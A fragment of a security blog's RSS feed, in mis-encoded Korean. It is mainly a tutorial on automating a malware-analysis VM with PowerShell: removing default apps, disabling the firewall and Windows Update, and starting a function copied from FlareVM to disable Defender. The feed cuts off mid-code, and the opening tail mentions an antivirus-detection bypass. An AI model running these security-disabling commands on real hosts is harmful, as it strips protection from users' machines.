detectionì„ ìš°íšŒí•  ìˆ˜ ìˆê³  Microsoftì—ì„œ NetLoaderì— signatureë¥¼ ì¶”ê°€í•˜ì§€ ì•Šì•„ in memory detection ë˜í•œ ìš°íšŒí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/idioth/">idioth</category>
      
      <category domain="https://hackyboiz.github.io/tags/malware/">malware</category>
      
      <category domain="https://hackyboiz.github.io/tags/bypass/">bypass</category>
      
      <category domain="https://hackyboiz.github.io/tags/defender/">defender</category>
      
      <category domain="https://hackyboiz.github.io/tags/signature/">signature</category>
      
      <category domain="https://hackyboiz.github.io/tags/heuristic/">heuristic</category>
      
      <category domain="https://hackyboiz.github.io/tags/antivirus/">antivirus</category>
      
      
      <comments>https://hackyboiz.github.io/2021/06/07/idioth/2021-06-07/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Research] ì•…ì„±ì½”ë“œ ë¶„ì„ìš© VM ì„¸íŒ…ì„ ìë™í™”í•´ë³´ì!</title>
      <link>https://hackyboiz.github.io/2021/06/06/idioth/setting_malware_vm/</link>
      <guid>https://hackyboiz.github.io/2021/06/06/idioth/setting_malware_vm/</guid>
      <pubDate>Sun, 06 Jun 2021 09:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h1 id=&quot;ì„œë¡ &quot;&gt;&lt;a href=&quot;#ì„œë¡ &quot; class=&quot;headerlink&quot; title=&quot;ì„œë¡ &quot;&gt;&lt;/a&gt;ì„œë¡ &lt;/h1&gt;&lt;p&gt;ì•ˆë…•í•˜ì„¸ìš”. idiothì…ë‹ˆë‹¤. ì˜¤ëŠ˜ ê°€ì ¸ì˜¨ ì£¼ì œëŠ” â€œì•…ì„±ì½”ë“œ ë¶„ì„ìš© ê°€ìƒ ë¨¸ì‹  ì„¤ì • ìë™í™”â€ì…ë‹ˆë‹¤.&lt;/p&gt;
&lt;p&gt;ë‹ê²ì€ ê·€ì°®</description>
        
      
      
      
      <content:encoded><![CDATA[<h1 id="ì„œë¡ "><a href="#ì„œë¡ " class="headerlink" title="ì„œë¡ "></a>ì„œë¡ </h1><p>ì•ˆë…•í•˜ì„¸ìš”. idiothì…ë‹ˆë‹¤. ì˜¤ëŠ˜ ê°€ì ¸ì˜¨ ì£¼ì œëŠ” â€œì•…ì„±ì½”ë“œ ë¶„ì„ìš© ê°€ìƒ ë¨¸ì‹  ì„¤ì • ìë™í™”â€ì…ë‹ˆë‹¤.</p><p>ë‹ê²ì€ ê·€ì°®ì€ í–‰ë™ì„ í•˜ê¸° ì‹«ì–´í•©ë‹ˆë‹¤.(ì €ë§Œ ê·¸ëŸ° ê±´ ì•„ë‹ˆê² ì£ ?) ë³´í†µ ì•…ì„±ì½”ë“œ ë¶„ì„ì€ ê°€ìƒ ë¨¸ì‹ ì—ì„œ ìˆ˜í–‰í•˜ê³ , ë˜ ë¶„ì„ìš© VMì„ ì—¬ëŸ¬ ê°œ ë“¤ê³  ìˆê±°ë‚˜ ì•„ë‹ˆë©´ ë‹¤ë¥¸ PCì— ì„¤ì¹˜í•´ì•¼ í•  ì¼ ë“±ì´ ìˆì£ . ì˜ˆë¥¼ ë“¤ì–´ ì € ê°™ì€ ê²½ìš°ëŠ” ì§‘ì— ìˆëŠ” ë°ìŠ¤í¬í†±ê³¼ í•™êµë‚˜ ì¹´í˜ ë“±ì—ì„œ ì‚¬ìš©í•˜ëŠ” ë…¸íŠ¸ë¶ìœ¼ë¡œ ë‚˜ë‰˜ì–´ ìˆìŠµë‹ˆë‹¤.</p><p>Windows ê°€ìƒ ë¨¸ì‹ ì—ë‹¤ê°€ ì´ëŸ°ì €ëŸ° ë„êµ¬ë“¤ì„ ì„¤ì •í•˜ë©´ ìš©ëŸ‰ì´ ì»¤ì ¸ì„œ ì••ì¶•í•˜ê±°ë‚˜ ì˜®ê¸°ëŠ” ë°ì—ë„ ì‹œê°„ì´ ê½¤ ê±¸ë¦½ë‹ˆë‹¤. ë°–ì— ìˆëŠ”ë° ë…¸íŠ¸ë¶ì„ í¬ë§·í•˜ê±°ë‚˜ í•˜ëŠ” ìƒí™©ì´ ë°œìƒí•˜ë©´ Windows ê°€ìƒ ë¨¸ì‹ ì„ ìƒˆë¡œ ë§Œë“¤ì–´ì„œ ì„¤ì •ì„ ì­‰ í•´ì•¼ í•˜ì£ .</p><p>í¬ë„ˆë¸”ì„ ê³µë¶€í•  ë•Œ ì‚¬ìš©í•˜ëŠ” ìš°ë¶„íˆ¬ì—ì„œëŠ” ì œê°€ ì‚¬ìš©í•˜ëŠ” íˆ´ ë“±ì„ ì‰˜ ìŠ¤í¬ë¦½íŠ¸ë¡œ ë‹¤ìš´ë¡œë“œ ë° ì„¤ì •í•˜ê²Œ ë§Œë“¤ì–´ì„œ ë¦¬ëˆ…ìŠ¤ë¥¼ ì‚¬ìš©í•  ë•Œ ì‰˜ ìŠ¤í¬ë¦½íŠ¸ë§Œ ì‹¤í–‰í•˜ê³  ë”´ì§“ì„ í•˜ë‹¤ ì˜¤ë©´ ì„¸íŒ…ì´ ë‹¤ ë˜ëŠ”ë° Windowsë„ ê°€ëŠ¥í• ê¹Œ?ë¼ëŠ” ìƒê°ì—ì„œ ì‹œì‘í–ˆìŠµë‹ˆë‹¤.</p><p><a href="https://github.com/fireeye/flare-vm">FireEyeì—ì„œ ë°°í¬í•˜ëŠ” FlareVM</a>ë„ ì¡´ì¬í•˜ì§€ë§Œ ëª¨ë“  íˆ´ì„ ë‹¤ ë‹¤ìš´ë¡œë“œí•˜ê¸°ë„ í•˜ê³  ì˜¤ë˜ ê±¸ë¦¬ë©´ í•˜ë£¨ ì¢…ì¼ ê±¸ë¦¬ëŠ” ê²½ìš°ë„ ìˆë”ë¼ê³ ìš”â€¦ ê·¸ë˜ì„œ ê±°ê¸°ì„œ ì˜ê°ì„ ì–»ì–´ì„œ ì œê°€ ìì£¼ ì‚¬ìš©í•˜ëŠ” íˆ´ë“¤ë¡œ êµ¬ì„±í•˜ì—¬ ì‘ì„±ì„ í•´ë³´ì•˜ìŠµë‹ˆë‹¤.(FlareVMì—ì„œ ê°€ì ¸ì˜¨ ì½”ë“œë„ ìˆìŠµë‹ˆë‹¤ ğŸ˜‚)</p><p>ë³¸ë˜ SSG ë™ì•„ë¦¬ ë‚´ë¶€ì—ì„œ ì•…ì„±ì½”ë“œ ê´€ë ¨ ìŠ¤í„°ë”” ë“±ì„ í•  ë•Œ ìŠ¤í¬ë¦½íŠ¸ ì£¼ë©´ì„œ ì´ê±° ì‹¤í–‰í•˜ë©´ ë  ê±°ì•¼~ í–ˆëŠ”ë° ê·¸ê±¸ ê·¸ëŒ€ë¡œ ë¸”ë¡œê·¸ì— ì˜¬ë¦¬ê¸°ì—ëŠ” ì½”ë“œê°€ ë„ˆë¬´ ì²˜ì°¸í•´ì„œâ€¦ (ë§¤ìš° ë”ëŸ½ìŠµë‹ˆë‹¤.) ì´ë²ˆ ê¸°íšŒì— ê¹”ë”í•˜ê²Œ ì‘ì„±í–ˆìŠµë‹ˆë‹¤.(ë¬¼ë¡  ì œ ê¸°ì¤€ì—ì„œë§Œ ê¹”ë”í•  ìˆ˜ë„ ìˆì–´ìš”! ì–‘í•´ ë°”ëë‹ˆë‹¤. ğŸ™‚   </p><p>íŒŒíŠ¸ëŠ” í¬ê²Œ ë‘ ê°€ì§€ë¡œ ë‚˜ë‰  ì˜ˆì •ì…ë‹ˆë‹¤. ì²« ë²ˆì§¸ íŒŒíŠ¸ì—ì„œëŠ” Windows ì„¤ì •ì— ëŒ€í•œ ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‘ì„±í•  ì˜ˆì •ì´ê³ , ë‘ ë²ˆì§¸ íŒŒíŠ¸ì—ì„œëŠ” <a href="https://chocolatey.org/">chocolatey</a>ë¥¼ í™œìš©í•œ íˆ´ë“¤ì„ ì„¤ì¹˜í•  ê²ë‹ˆë‹¤!</p><h1 id="ë¬´ì—‡ì„-ì„¤ì •í•´ì•¼-í• ê¹Œ"><a href="#ë¬´ì—‡ì„-ì„¤ì •í•´ì•¼-í• ê¹Œ" class="headerlink" title="ë¬´ì—‡ì„ ì„¤ì •í•´ì•¼ í• ê¹Œ?"></a>ë¬´ì—‡ì„ ì„¤ì •í•´ì•¼ í• ê¹Œ?</h1><p>ê°€ì¥ ë¨¼ì € ìŠ¤í¬ë¦½íŠ¸ë¥¼ í†µí•´ì„œ ë¬´ì—‡ì„ í•´ì•¼ í• ì§€ ì •ë¦¬ë¥¼ í•˜ê³  ì‹œì‘í•©ì‹œë‹¤. ì•„ë¬´ë˜ë„ ì•…ì„±ì½”ë“œ ë¶„ì„ì„ í•´ì•¼ í•˜ë¯€ë¡œ Windows Defenderì™€ Windows UpdateëŠ” êº¼ë†“ëŠ” ê²ƒì´ ì¢‹ê² ì£ ? ì‹œì‘ í”„ë¡œê·¸ë¨ì— ë“±ë¡ë˜ì—ˆì„ ë•Œ ë³µì¡í•˜ê²Œ í•˜ì§€ ì•Šê¸° ìœ„í•´ì„œ ì‹œì‘ í”„ë¡œê·¸ë¨ë„ ì •ë¦¬í•˜ê³ â€¦ ì‚¬ìš©í•˜ì§€ ì•ŠëŠ” ê¸°ë³¸ ì•± ì‚­ì œ ë“±â€¦ ì œê°€ ìƒê°ë‚˜ëŠ” ëŒ€ë¡œ ê°„ë‹¨í•˜ê²Œ ì •ë¦¬í•´ë³´ì•˜ìŠµë‹ˆë‹¤.</p><ol><li>ì‚¬ìš©í•˜ì§€ ì•ŠëŠ” ê¸°ë³¸ ì•± ì‚­ì œ</li><li>ë°©í™”ë²½ ë¹„í™œì„±í™”</li><li>Windows Update ë¹„í™œì„±í™”</li><li>Windows Defender ë¹„í™œì„±í™”</li><li>ë³´ì•ˆìœ ì§€ ì •ì±… ì•Œë¦¼ ë¹„í™œì„±í™”</li><li>ì‘ì—… ìŠ¤ì¼€ì¤„ëŸ¬ ì‚­ì œ</li><li>ì‹œì‘ í”„ë¡œê·¸ë¨ ì‚­ì œ</li><li>ìˆ¨ê¹€ íŒŒì¼ í‘œì‹œ</li></ol><p>Windowsì—ì„œ ì‰˜ ìŠ¤í¬ë¦½íŠ¸ë¡œ í•œ ë²ˆì— ì„¤ì •ì„ í•œë‹¤ê³ ? ë­”ê°€ ë‚¯ì„¤ê²Œ ëŠê»´ì§€ì‹œëŠ” ë¶„ë“¤ë„ ê³„ì‹œê² ì§€ë§Œ Windowsì—ëŠ” Powershellì´ ì¡´ì¬í•©ë‹ˆë‹¤. Powershellì„ ì‚¬ìš©í•´ì„œ ìœ„ì˜ ì‘ì—…ë“¤ì„ í•˜ë‚˜í•˜ë‚˜ ì§„í–‰í•´ë´…ì‹œë‹¤!</p><h1 id="ì‚¬ìš©í•˜ì§€-ì•ŠëŠ”-ê¸°ë³¸-ì•±-ì‚­ì œ"><a href="#ì‚¬ìš©í•˜ì§€-ì•ŠëŠ”-ê¸°ë³¸-ì•±-ì‚­ì œ" class="headerlink" title="ì‚¬ìš©í•˜ì§€ ì•ŠëŠ” ê¸°ë³¸ ì•± ì‚­ì œ"></a>ì‚¬ìš©í•˜ì§€ ì•ŠëŠ” ê¸°ë³¸ ì•± ì‚­ì œ</h1><p>ì²˜ìŒ Windowsë¥¼ ì„¤ì¹˜í•˜ë©´ 3D ë·°ì–´ë‚˜, BingFinance, OfficeHub ë“±ë“± ì•…ì„±ì½”ë“œ ë¶„ì„ì—ëŠ” í™œìš©ë˜ì§€ ì•ŠëŠ” ì• í”Œë¦¬ì¼€ì´ì…˜ë“¤ì´ ë§ì´ ì„¤ì¹˜ë˜ì–´ ìˆìŠµë‹ˆë‹¤. ì´ëŸ° ì•±ì„ ì†ìˆ˜ ì§€ìš¸ ìˆ˜ë„ ìˆìœ¼ë‚˜ <code>Remove-AppxPackage</code> ëª…ë ¹ì–´ë¥¼ í†µí•´ì„œ ì‚­ì œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> C:\Windows\system32&gt; <span class="hljs-built_in">Get-AppxPackage</span> Microsoft.XboxAppName              : Microsoft.XboxAppPublisher         : CN=Microsoft Corporation, O=Microsoft Corporation, L=Redmond, S=Washington, C=USArchitecture      : X64ResourceId        :Version           : <span class="hljs-number">48.76</span>.<span class="hljs-number">8001.0</span>PackageFullName   : Microsoft.XboxApp_48.<span class="hljs-number">76.8001</span>.<span class="hljs-number">0</span>_x64__8wekyb3d8bbweInstallLocation   : C:\Program Files\WindowsApps\Microsoft.XboxApp_48.<span class="hljs-number">76.8001</span>.<span class="hljs-number">0</span>_x64__8wekyb3d8bbweIsFramework       : FalsePackageFamilyName : Microsoft.XboxApp_8wekyb3d8bbwePublisherId       : <span class="hljs-number">8</span>wekyb3d8bbweIsResourcePackage : FalseIsBundle          : FalseIsDevelopmentMode : FalseNonRemovable      : FalseDependencies      : &#123;Microsoft.NET.Native.Framework.<span class="hljs-number">1.7</span>_1.<span class="hljs-number">7.27413</span>.<span class="hljs-number">0</span>_x64__8wekyb3d8bbwe, Microsoft.NET.Native.Runtime.<span class="hljs-number">1.7</span>_1.<span class="hljs-number">7.27422</span>.<span class="hljs-number">0</span>_x64__8wekyb3d8bbwe, Microsoft.VCLibs.<span class="hljs-number">140.00</span>_14.<span class="hljs-number">0.29231</span>.<span class="hljs-number">0</span>_x64__8wekyb3d8bbwe, Microsoft.VCLibs.<span class="hljs-number">140.00</span>.UWPDesktop_14.<span class="hljs-number">0.29231</span>.<span class="hljs-number">0</span>_x64__8wekyb3                    d8bbwe...&#125;IsPartiallyStaged : FalseSignatureKind     : StoreStatus            : Ok</code></pre><p>ì˜ˆë¥¼ ë“¤ì–´ XboxAppì˜ ê²½ìš° ë¶„ì„ì—ì„œëŠ” ì•„ì˜ˆ ì‚¬ìš©í•˜ì§€ ì•Šê² ì£ ? <code>Get-AppxPackage</code>ë¥¼ í†µí•´ íŒ¨í‚¤ì§€ì˜ ì •ë³´ë¥¼ ê°€ì ¸ì˜¬ ìˆ˜ ìˆê³ , íŒŒì´í”„ë¼ì¸ìœ¼ë¡œ <code>Remove-AppxPackage</code>ë¥¼ ì‚¬ìš©í•˜ë©´ í•´ë‹¹ íŒ¨í‚¤ì§€ê°€ ì‚­ì œë©ë‹ˆë‹¤.</p><p>ì´ë¥¼ í† ëŒ€ë¡œ ì‘ì„±í•œ ì†ŒìŠ¤ ì½”ë“œëŠ” ì•„ë˜ì™€ ê°™ìŠµë‹ˆë‹¤.</p><pre><code class="hljs powershell"><span class="hljs-variable">$packages</span> = <span class="hljs-selector-tag">@</span>(    <span class="hljs-string">&quot;7EE7776C.LinkedInforWindows&quot;</span>    <span class="hljs-string">&quot;C27EB4BA.DropboxOEM&quot;</span>    <span class="hljs-string">&quot;Microsoft.3DBuilder&quot;</span>    <span class="hljs-string">&quot;Microsoft.Microsoft3DViewer&quot;</span>    <span class="hljs-string">&quot;Microsoft.Advertising.Xaml&quot;</span>    <span class="hljs-string">&quot;Microsoft.Appconnector&quot;</span>    <span class="hljs-string">&quot;Microsoft.BingFinance&quot;</span>    <span class="hljs-string">&quot;Microsoft.BingFoodAndDrink&quot;</span>    <span class="hljs-string">&quot;Microsoft.BingHealthAndFitness&quot;</span>    <span class="hljs-string">&quot;Microsoft.BingNews&quot;</span>    <span class="hljs-string">&quot;Microsoft.BingSports&quot;</span>    <span class="hljs-string">&quot;Microsoft.BingTravel&quot;</span>    <span class="hljs-string">&quot;Microsoft.BingWeather&quot;</span>    <span class="hljs-string">&quot;Microsoft.CommsPhone&quot;</span>    <span class="hljs-string">&quot;Microsoft.ConnectivityStore&quot;</span>    <span class="hljs-string">&quot;Microsoft.DesktopAppInstaller&quot;</span>    <span class="hljs-string">&quot;Microsoft.Getstarted&quot;</span>    <span class="hljs-string">&quot;Microsoft.Messaging&quot;</span>    <span class="hljs-string">&quot;Microsoft.Microsoft3DViewer&quot;</span>    <span class="hljs-string">&quot;Microsoft.MicrosoftOfficeHub&quot;</span>    <span class="hljs-string">&quot;Microsoft.MicrosoftSolitaireCollection&quot;</span>    <span class="hljs-string">&quot;Microsoft.MixedReality.Portal&quot;</span>    <span class="hljs-string">&quot;Microsoft.Netflix&quot;</span>    <span class="hljs-string">&quot;Microsoft.NetworkSpeedTest&quot;</span>    <span class="hljs-string">&quot;Microsoft.Office.Desktop&quot;</span>    <span class="hljs-string">&quot;Microsoft.Office.OneNote&quot;</span>    <span class="hljs-string">&quot;Microsoft.Office.Sway&quot;</span>    <span class="hljs-string">&quot;Microsoft.OfficeLens&quot;</span>    <span class="hljs-string">&quot;Microsoft.OneConnect&quot;</span>    <span class="hljs-string">&quot;Microsoft.OneDrive&quot;</span>    <span class="hljs-string">&quot;Microsoft.People&quot;</span>    <span class="hljs-string">&quot;Microsoft.Print3D&quot;</span>    <span class="hljs-string">&quot;Microsoft.RemoteDesktop&quot;</span>    <span class="hljs-string">&quot;Microsoft.SkypeApp&quot;</span>    <span class="hljs-string">&quot;Microsoft.Wallet&quot;</span>    <span class="hljs-string">&quot;Microsoft.Windows.CloudExperienceHost&quot;</span>    <span class="hljs-string">&quot;Microsoft.Windows.NarratorQuickStart&quot;</span>    <span class="hljs-string">&quot;Microsoft.Windows.PeopleExperienceHost&quot;</span>    <span class="hljs-string">&quot;Microsoft.Windows.Photos&quot;</span>    <span class="hljs-string">&quot;Microsoft.WindowsAlarms&quot;</span>    <span class="hljs-string">&quot;Microsoft.WindowsCamera&quot;</span>    <span class="hljs-string">&quot;Microsoft.windowscommunicationsapps&quot;</span>    <span class="hljs-string">&quot;Microsoft.WindowsFeedbackHub&quot;</span>    <span class="hljs-string">&quot;Microsoft.WindowsMaps&quot;</span>    <span class="hljs-string">&quot;Microsoft.WindowsPhone&quot;</span>    <span class="hljs-string">&quot;Microsoft.WindowsReadingList&quot;</span>    <span class="hljs-string">&quot;Microsoft.WindowsSoundRecorder&quot;</span>    <span class="hljs-string">&quot;Microsoft.Xbox.TCUI&quot;</span>    <span class="hljs-string">&quot;Microsoft.XboxApp&quot;</span>    <span class="hljs-string">&quot;Microsoft.XboxGameCallableUI&quot;</span>    <span class="hljs-string">&quot;Microsoft.XboxGameOverlay&quot;</span>    <span class="hljs-string">&quot;Microsoft.XboxGamingOverlay&quot;</span>    <span class="hljs-string">&quot;Microsoft.XboxIdentityProvider&quot;</span>    <span class="hljs-string">&quot;Microsoft.XboxLive&quot;</span>    <span class="hljs-string">&quot;Microsoft.XboxSpeechToTextOverlay&quot;</span>    <span class="hljs-string">&quot;Microsoft.YourPhone&quot;</span>    <span class="hljs-string">&quot;Microsoft.ZuneMusic&quot;</span>    <span class="hljs-string">&quot;Microsoft.ZuneVideo&quot;</span>    <span class="hljs-string">&quot;Windows.CBSPreview&quot;</span>)<span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$name</span> <span class="hljs-keyword">in</span> <span class="hljs-variable">$packages</span>)&#123;    <span class="hljs-built_in">Get-AppxPackage</span> <span class="hljs-variable">$name</span> | <span class="hljs-built_in">Remove-AppxPackage</span>&#125;</code></pre><p><code>$packages</code>ì— ìˆëŠ” íŒ¨í‚¤ì§€ ì´ë¦„ì„ í•˜ë‚˜ì”© ê°€ì ¸ì™€ì„œ ì‚­ì œë¥¼ í•˜ëŠ” ë¶€ë¶„ì…ë‹ˆë‹¤. ì¶”ê°€ë˜ì–´ ìˆì§€ ì•Šì€ ì• í”Œë¦¬ì¼€ì´ì…˜ë„ ì¡´ì¬í•˜ê¸° ë•Œë¬¸ì— í˜¹ì‹œ ë³¸ì¸ì´ ì‚­ì œí•˜ê³  ì‹¶ì§€ ì•Šê±°ë‚˜ ì‚­ì œí•˜ê³  ì‹¶ì€ í”„ë¡œê·¸ë¨ì´ ìˆìœ¼ë©´ ì¶”ê°€ë¥¼ í•˜ì‹œë©´ ë©ë‹ˆë‹¤.</p><p><img src="/2021/06/06/idioth/setting_malware_vm/Untitled.png"></p><p>ì‚­ì œí•˜ê³  ì‹¶ì€ ì•±ì´ ìˆëŠ”ë° íŒ¨í‚¤ì§€ ì´ë¦„ì„ ëª¨ë¥´ì‹œê² ë‹¤ê³ ìš”? ê±±ì •í•˜ì§€ ë§ˆì„¸ìš”! ê¹”ë ¤ìˆëŠ” íŒ¨í‚¤ì§€ë¥¼ ì´ë¦„ìœ¼ë¡œ ì •ë ¬í•´ì„œ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤!</p><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> C:\Windows\system32&gt; <span class="hljs-built_in">Get-AppxPackage</span> | <span class="hljs-built_in">Select</span> NameName----windows.immersivecontrolpanelMicrosoft.VCLibs.<span class="hljs-number">140.00</span>Microsoft.UI.Xaml.<span class="hljs-number">2.0</span>Windows.PrintDialogMicrosoft.WalletMicrosoft.VCLibs.<span class="hljs-number">140.00</span>Microsoft.VCLibs.<span class="hljs-number">140.00</span>RealtekSemiconductorCorp.RealtekAudioControlMicrosoft.VCLibs.<span class="hljs-number">140.00</span>.UWPDesktopMicrosoft.VCLibs.<span class="hljs-number">140.00</span>.UWPDesktopAdvancedMicroDevicesInc<span class="hljs-literal">-2</span>.AMDRadeonSoftwareMicrosoft.XboxSpeechToTextOverlayMicrosoft.XboxGameOverlayMicrosoft.NET.Native.Runtime.<span class="hljs-number">2.2</span>Microsoft.NET.Native.Runtime.<span class="hljs-number">2.2</span>Microsoft.NET.Native.Framework.<span class="hljs-number">2.2</span>Microsoft.NET.Native.Framework.<span class="hljs-number">2.2</span>Microsoft.Xbox.TCUIMicrosoft.UI.Xaml.<span class="hljs-number">2.4</span>Microsoft.UI.Xaml.<span class="hljs-number">2.4</span>Microsoft.UI.Xaml.<span class="hljs-number">2.0</span>Microsoft.UI.Xaml.<span class="hljs-number">2.1</span>Microsoft.UI.Xaml.<span class="hljs-number">2.1</span>Microsoft.NET.Native.Framework.<span class="hljs-number">1.7</span>Microsoft.NET.Native.Framework.<span class="hljs-number">1.7</span>Microsoft.NET.Native.Runtime.<span class="hljs-number">1.7</span>Microsoft.NET.Native.Runtime.<span class="hljs-number">1.7</span>Microsoft.UI.Xaml.<span class="hljs-number">2.3</span>Microsoft.UI.Xaml.<span class="hljs-number">2.3</span>Microsoft.UI.Xaml.<span class="hljs-number">2.5</span>Microsoft.UI.Xaml.<span class="hljs-number">2.5</span>Microsoft.<span class="hljs-number">549981</span>C3F5F10Microsoft.StorePurchaseAppMicrosoft.LanguageExperiencePackko<span class="hljs-literal">-KR</span>Microsoft.WinDbgmicrosoft.windowscommunicationsappsMicrosoft.WebpImageExtensionMicrosoft.XboxIdentityProviderMicrosoft.DesktopAppInstallerMicrosoft.Windows.PhotosMicrosoft.WebMediaExtensionsMicrosoft.XboxAppMicrosoft.MixedReality.PortalMicrosoft.PeopleMicrosoft.WindowsStoreMicrosoft.ZuneVideoMicrosoft.Microsoft3DViewerMicrosoft.WindowsFeedbackHubMicrosoft.MicrosoftStickyNotesMicrosoft.WindowsAlarmsMicrosoft.GetHelpMicrosoft.BingWeatherMicrosoft.WindowsCameraMicrosoft.ScreenSketchMicrosoft.WindowsMapsMicrosoft.WindowsCalculatorMicrosoft.WindowsSoundRecorderMicrosoft.ZuneMusicMicrosoft.BioEnrollmentMicrosoft.Windows.CloudExperienceHostMicrosoft.Windows.OOBENetworkConnectionFlowMicrosoft.AAD.BrokerPluginMicrosoft.Windows.OOBENetworkCaptivePortalMicrosoftWindows.UndockedDevKitMicrosoft.Windows.StartMenuExperienceHostMicrosoft.Windows.ShellExperienceHostMicrosoft.Windows.SearchMicrosoft.MicrosoftEdgeMicrosoft.Windows.ContentDeliveryManagerMicrosoftWindows.Client.CBSWindows.CBSPreviewNcsiUwpAppMicrosoft.XboxGameCallableUIMicrosoft.Windows.XGpuEjectDialogMicrosoft.Windows.SecureAssessmentBrowserMicrosoft.Windows.SecHealthUIMicrosoft.Windows.PinningConfirmationDialogMicrosoft.Windows.PeopleExperienceHostMicrosoft.Windows.ParentalControlsMicrosoft.Windows.NarratorQuickStartMicrosoft.Windows.CapturePickerMicrosoft.Windows.CallingShellAppMicrosoft.Windows.AssignedAccessLockAppMicrosoft.Windows.Apprep.ChxAppMicrosoft.Win32WebViewHostMicrosoft.MicrosoftEdgeDevToolsClientMicrosoft.LockAppMicrosoft.ECAppMicrosoft.CredDialogHostMicrosoft.AsyncTextServiceMicrosoft.AccountsControlMicrosoft.VP9VideoExtensionsMicrosoft.XboxGamingOverlayMicrosoft.HEIFImageExtensionMicrosoft.MSPaint<span class="hljs-number">91750</span>D7E.SlackMicrosoft.MicrosoftEdge.StableMicrosoft.GetstartedMicrosoft.YourPhone</code></pre><p>ì´ë¦„ì„ ì°¾ì•˜ëŠ”ë° <code>Xbox</code>ì²˜ëŸ¼ ì—¬ëŸ¬ ê°œê°€ ìˆëŠ”ë° ì ê¸°ê°€ ë„ˆë¬´ ê·€ì°®ë‹¤. ë‚˜ëŠ” í•œ ë²ˆì— í•´ì¹˜ìš°ê³  ì‹¶ë‹¤! í•˜ì‹œëŠ” ë¶„ì€ <code>Microsoft.Xbox*</code>í•˜ì‹œë©´ ë¦¬ëˆ…ìŠ¤ì™€ ê°™ì´ <code>Microsoft.Xbox1</code> ë“± ë’¤ì— ì¶”ê°€ë˜ì–´ ìˆëŠ”(?) ë­ë¼ ë§í•´ì•¼ í•˜ì§€â€¦ ìƒê°ì´ ì•ˆ ë‚˜ë„¤ìš”! ì•„ë¬´íŠ¼! ì € ë¬¸ìì—´ë¡œ ì‹œì‘í•˜ëŠ” ì¹œêµ¬ë“¤ì„ ëª¨ë‘ ì‚­ì œí•´ì¤ë‹ˆë‹¤!</p><p>ê·¸ëŸ¼ ì´ì œ ë°©í™”ë²½ì„ ë¹„í™œì„±í™”í•˜ëŸ¬ ê°€ë³¼ê¹Œìš”?</p><h1 id="ë°©í™”ë²½-ë¹„í™œì„±í™”"><a href="#ë°©í™”ë²½-ë¹„í™œì„±í™”" class="headerlink" title="ë°©í™”ë²½ ë¹„í™œì„±í™”"></a>ë°©í™”ë²½ ë¹„í™œì„±í™”</h1><p>ë°©í™”ë²½ ë¹„í™œì„±í™”ëŠ” êµ‰ì¥íˆ<del>~</del> ì½”ë“œê°€ ê°„ë‹¨í•©ë‹ˆë‹¤.</p><p>ë„ë©”ì¸, ê³µìš©, ê°œì¸ì— ëŒ€í•œ ë°©í™”ë²½ ëª¨ë‘ë¥¼ ë¹„í™œì„±í™”í•˜ë©´ ë˜ëŠ”ë° ìš”ê±°ëŠ” PowerShellì„ í†µí•´ í•œë²ˆì— ì‘ì—…í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. XD</p><pre><code class="hljs powershell"><span class="hljs-built_in">Set-NetFirewallProfile</span> <span class="hljs-literal">-Profile</span> Domain, Public, Private <span class="hljs-literal">-Enabled</span> False</code></pre><h1 id="Windows-Update-ë¹„í™œì„±í™”"><a href="#Windows-Update-ë¹„í™œì„±í™”" class="headerlink" title="Windows Update ë¹„í™œì„±í™”"></a>Windows Update ë¹„í™œì„±í™”</h1><p>Windows Updateë¥¼ ë¹„í™œì„±í™”í•˜ê¸° ìœ„í•´ì„œëŠ” WindowsUpdate ë ˆì§€ìŠ¤íŠ¸ë¦¬ì— <code>NoAutoUpdate</code>ë¥¼ ì„¤ì •í•´ì£¼ë©´ ë©ë‹ˆë‹¤.</p><pre><code class="hljs powershell"><span class="hljs-built_in">New-Item</span> <span class="hljs-literal">-Path</span> <span class="hljs-string">&quot;HKLM:\SOFTWARE\Policies\Microsoft\Windows&quot;</span> <span class="hljs-literal">-Name</span> <span class="hljs-string">&quot;WindowsUpdate&quot;</span> <span class="hljs-literal">-ea</span> <span class="hljs-number">0</span> | <span class="hljs-built_in">Out-Null</span><span class="hljs-built_in">New-Item</span> <span class="hljs-literal">-Path</span> <span class="hljs-string">&quot;HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate&quot;</span> <span class="hljs-literal">-Name</span> <span class="hljs-string">&quot;AU&quot;</span> <span class="hljs-literal">-ea</span> <span class="hljs-number">0</span> | <span class="hljs-built_in">Out-Null</span><span class="hljs-built_in">New-ItemProperty</span> <span class="hljs-literal">-Path</span> <span class="hljs-string">&quot;HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU&quot;</span> <span class="hljs-literal">-Name</span> <span class="hljs-string">&quot;NoAutoUpdate&quot;</span> <span class="hljs-literal">-Value</span> <span class="hljs-number">1</span> <span class="hljs-literal">-PropertyType</span> DWORD <span class="hljs-literal">-Force</span> <span class="hljs-literal">-ea</span> <span class="hljs-number">0</span> | <span class="hljs-built_in">Out-Null</span></code></pre><h1 id="Windows-Defender-ë¹„í™œì„±í™”"><a href="#Windows-Defender-ë¹„í™œì„±í™”" class="headerlink" title="Windows Defender ë¹„í™œì„±í™”"></a>Windows Defender ë¹„í™œì„±í™”</h1><p>ë°©í™”ë²½ ë¹„í™œì„±í™”ëŠ” Windows Defender ë ˆì§€ìŠ¤íŠ¸ë¦¬ì— <code>DisableAntiSpyware</code>ë§Œ ì¶”ê°€ë¥¼ í•´ë†“ì•˜ì—ˆëŠ”ë°, flare-vmì—ì„œ ì‚¬ìš©í•˜ëŠ” ì½”ë“œë¥¼ ê·¸ëŒ€ë¡œ ê°€ì ¸ì™”ìŠµë‹ˆë‹¤.</p><pre><code class="hljs powershell"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">disable_defender</span><span class="hljs-params">()</span></span>&#123;    <span class="hljs-built_in">Write-Host</span> <span class="hljs-string">&quot;[*] Disable Windows 